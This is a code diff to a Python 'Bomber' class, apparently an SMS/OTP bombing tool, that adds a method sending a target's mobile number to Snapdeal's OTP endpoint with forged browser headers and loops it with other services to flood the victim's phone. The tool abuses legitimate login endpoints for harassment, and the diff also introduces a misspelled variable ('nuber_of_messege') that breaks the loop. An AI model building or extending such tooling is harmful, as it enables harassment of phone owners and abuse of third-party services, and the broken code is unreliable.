@@ -271,6 +271,33 @@ class Bomber:
 			return False
 		if(request.status_code==200):
 			return True
+	def snapdeal(self):
+		url = "https://www.snapdeal.com/sendOTP"
+		snapdeal_head = {
+			"accept": "*/*",
+			"accept-encoding": "gzip, deflate, br",
+			"accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
+			"content-length": "62",
+			"content-type": "application/x-www-form-urlencoded",
+			"DNT": "1",
+			"Host": "www.snapdeal.com",
+			"origin": "https://www.snapdeal.com",
+			"referer": "https://www.snapdeal.com/iframeLogin",
+			"sec-fetch-dest": "empty",
+			"sec-fetch-mode": "cors",
+			"sec-fetch-site": "same-origin",
+			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
+			"X-Requested-With": "XMLHttpRequest"
+		}
+		try:
+			request = requests.post(url, data="emailId=&mobileNumber="+ self.user_mobile + "&purpose=LOGIN_WITH_MOBILE_OTP",headers=snapdeal_head)
+		except:
+			return False
+		if (request.json()['status'] == "fail"):
+			return False
+		return True
+		
+		
 
 	def startBombing(self):
 		if(self._checkinternet()):
@@ -309,10 +336,13 @@ class Bomber:
 				if self.unacademy():
 					print("Sent !!!!!")
 					counter+=1
-				if(counter == number_of_messege):
+				if self.snapdeal():
+					print("Sent !!!!")
+					counter +=1
+				if(counter == nuber_of_messege):
 					break
 
-											#["flipkart","confirmtkt","lenskart","justdial","indialends","apolopharmacy","magicbrick","ajio","mylescars","unacademy"]:
+			#["flipkart","confirmtkt","lenskart","justdial","indialends","apolopharmacy","magicbrick","ajio","mylescars","unacademy","snapdeal"]:
 		else:
 			print("possible errors -  Internet connectivity")
 
